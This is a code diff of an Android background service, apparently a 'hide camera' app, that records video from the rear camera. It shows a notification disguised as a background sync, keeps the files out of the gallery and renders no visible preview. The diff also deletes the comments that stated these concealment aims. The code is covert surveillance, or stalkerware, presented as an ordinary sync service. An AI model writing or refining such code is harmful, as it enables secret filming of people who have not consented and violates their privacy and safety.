@@ -1,4 +1,5 @@
-package com.example.hidecamera;
+// Aapke asli app ke folder ke hisab se package name theek kar diya hai
+package com.example.hidecamera; 
 
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -16,6 +17,9 @@ import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 import java.io.File;
 
+// Sabse zaroori line: Aapke main app ke resources (R) ko import kiya gaya hai
+import com.example.btmic.R; 
+
 public class BackgroundRecorderService extends Service {
     private static final int NOTIFICATION_ID = 101;
     private static final String CHANNEL_ID = "Background_Sync_Channel";
@@ -29,7 +33,6 @@ public class BackgroundRecorderService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         createNotificationChannel();
         
-        // Hide Camera active hone par fake background sync notification dikhega
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle(getString(R.string.notification_title))
                 .setContentText(getString(R.string.notification_desc))
@@ -55,12 +58,10 @@ public class BackgroundRecorderService extends Service {
             mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
             mMediaRecorder.setProfile(CamcorderProfile.get(Camera.CameraInfo.CAMERA_FACING_BACK, CamcorderProfile.QUALITY_720P));
 
-            // Sabse Important: File Gallery me nahi, App ke internal private hidden folder me save hogi
             File outputDir = getExternalFilesDir(null); 
             File videoFile = new File(outputDir, "SEC_VID_" + System.currentTimeMillis() + ".mp4");
             mMediaRecorder.setOutputFile(videoFile.getAbsolutePath());
 
-            // Fake layout taaki screen normal rahe aur user ko camera preview na dikhe
             mDummySurfaceView = new SurfaceView(this);
             mMediaRecorder.setPreviewDisplay(mDummySurfaceView.getHolder().getSurface());
 
